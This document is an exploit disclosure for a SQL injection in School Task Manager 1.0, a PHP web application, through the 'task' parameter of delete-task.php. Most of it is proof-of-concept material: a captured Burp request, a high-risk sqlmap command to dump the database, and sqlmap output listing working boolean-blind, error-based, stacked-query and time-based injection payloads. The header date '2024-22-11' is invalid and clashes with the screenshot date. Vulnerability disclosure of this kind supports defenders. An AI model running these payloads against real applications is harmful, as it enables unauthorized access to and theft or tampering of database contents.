# School-Task-Manager-System-SQL_Injection-1
+ **Exploit Title:** School-Task-Manager-System-SQL_Injection-1
+ **Date:** 2024-22-11
+ **Exploit Author:** Burak Sevben
+ **Vendor Homepage:** https://www.sourcecodester.com/php/16877/school-task-manager-using-php-source-code.html
+ **Software Link:** https://www.sourcecodester.com/download-code?nid=16877&title=School+Task+Manager+Using+PHP+with+Source+Code
+ **Version:** 1.0
+ **Tested on:** Kali Linux + PHP 8.2.12, Apache 2.4.58
+ **CVE:** Reported, waiting for CVE number

## Description:
School Task Manager App 1.0 allows SQL Injection via the 'task' parameter in "/school-task-manager/endpoint/delete-task.php?task=5". Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit the latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to this address: "localhost/school-task-manager/index.php"
+ Select any task and press the delete-task button
+ Capture the request via Burp Suite and send it to the Repeater.
+ Copy the request and paste it into an "r.txt" file.
+ Captured Burp request:
```
GET /school-task-manager/endpoint/delete-task.php?task=5 HTTP/1.1
Host: localhost
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
```
+ Use sqlmap to exploit. In sqlmap, use 'task' parameter to dump the database.
```
sqlmap -r r.txt -p task --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db
```
```
Parameter: task (GET)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: task=5' RLIKE (SELECT (CASE WHEN (2662=2662) THEN 5 ELSE 0x28 END))-- miQh

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: task=5' AND EXTRACTVALUE(6730,CONCAT(0x5c,0x7171627871,(SELECT (ELT(6730=6730,1))),0x717a716271))-- RTrX

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: task=5';SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: task=5' AND (SELECT 3686 FROM (SELECT(SLEEP(5)))oiSk)-- tcLg
---
[18:07:59] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.58, PHP 8.2.12
back-end DBMS: MySQL >= 5.1 (MariaDB fork)
[18:07:59] [INFO] fetching current database
[18:07:59] [INFO] retrieved: 'school_task_manager_db'
current database: 'school_task_manager_db'
```
+ current database: `school_task_manager_db`
![Ekran görüntüsü 2024-01-22 030940](https://github.com/BurakSevben/School-Task-Manager-System-SQLi-1/assets/117217689/08ca7497-68b4-429c-8503-d276fec18f48)


